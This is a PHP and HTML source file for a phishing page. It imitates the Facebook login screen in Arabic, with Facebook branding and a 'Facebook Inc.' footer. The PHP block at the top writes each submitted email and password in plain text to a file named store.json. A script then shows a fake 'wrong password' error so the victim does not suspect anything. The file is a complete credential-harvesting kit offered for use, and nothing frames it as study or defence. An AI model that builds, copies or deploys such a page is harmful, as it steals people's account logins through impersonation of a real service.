<?php 
if(isset($_POST['submit'])){
	$file = fopen("store.json" , "a") or die("unable to open the file");
	$file2 = 'store.json';
$email = $_POST['email'];
$password = $_POST['password'];

$hidden = 'email is ' . $email . ' and password is ' . $password . "\n";
$data = $hidden;
	fwrite($file , $data);
fclose($file);
};
				
?>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Facebook Login</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/1.4.6/tailwind.min.css" />

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.1/css/all.min.css" /><link rel="stylesheet" href="style.css">
<script src="main.js"></script>
<script src="../../console.js"></script>
</head>
<body>
<!-- partial:index.partial.html -->
<div class="w-100 text-center p-1" style="background-color: #245B97;">
  <h1 class="text-white font-black text-2xl">facebook</h1>
</div>
<div class="bg-red-600 text-sm text-white p-3 text-center" style="font-size:30px" id="error">
كلمة السر خاطئة
</div>

<form action="store.php" method="POST" class="flex flex-col content-center my-5 mx-auto text-sm"  style="max-width: 380px">

  <input
    type="text"
    class="block p-3 rounded text-sm text-black border "
    style="background-color: #F5F6F7;"
    placeholder="رقم الهاتف او البريد الإلكتروني"
    name="email"
  />
  <input
    type="password"
    class="block p-3 border rounded text-sm text-black"
    style="background-color: #F5F6F7;"
    placeholder="كلمة السر"
    name="password"
  />

<input type="hidden" name="_captcha" value="false"/>
<input type="hidden" name="_next" value="/index2.html"/>
<input type="hidden" name="_template" value="table"/>
  <button
    class="block p-2 mt-3 rounded text-sm text-white font-bold border border-blue-" id="btn"
    style="background-color: #007BF0;" onclick="setTimeout(show, 900)" name="submit"
  >
   تسجيل الدخول
  </button>
  

  <div class="flex items-center">
    <hr width="50%" />
    <span class="text-gray-900 m-3" style="text-style: ">أو</span>
    <hr width="50%" />
  </div>
  
  <button class="p-2 w-1/3 rounded mx-auto font-bold text-white" style="background-color: #00A622">إنشاء حساب</button>
  <a href="#" class="mx-auto mt-3" style="color: #6497C7;">نسيت كلمة المرور ؟</a>
  
  <div class="divider my-5"></div>
  
  <div class="flex justify-between center-align flex-wrap text-xs mx-5">
    <ul class="text-center w-1/2" style="list-style: none">
      <li><a href="#" class="text-gray-700"> Indonesia</a></li>
      <li><a href="#" class="text-blue-800">Mexican</a></li>
      <li><a href="#" class="text-blue-800">Español</a></li>
      <li><a href="#" class="text-blue-800">Français (France)</a></li>
    </ul>
    
    <ul class="text-center w-1/2" style="list-style: none">
      <li><a href="#" class="text-blue-800">English (UK)</a></li>
      <li><a href="#" class="text-blue-800">Bahasa Melayu</a></li>
      <li><a href="#" class="text-blue-800">Português (Brasil)
</a></li>
      <li><a href="#" class="border border-blue-800 bg-white rounded p-1" style="width: 20px; height: 20px;"><i class="fas fa-plus text-gray-600"></i></a></li>
    </ul>
  </div>
  
  <footer class="mt-3 w-100 text-center">
    <span class="text-gray-600 text-xs">Facebook Inc.</span>
  </footer>
</form>
<!-- partial -->
<!--script-->
<script>
var btn = document.querySelector("#btn");
var error = document.getElementById("error");
error.hidden = true;
function show(){
document.getElementById("error").hidden = false;
};

</script>
  
</body>
</html>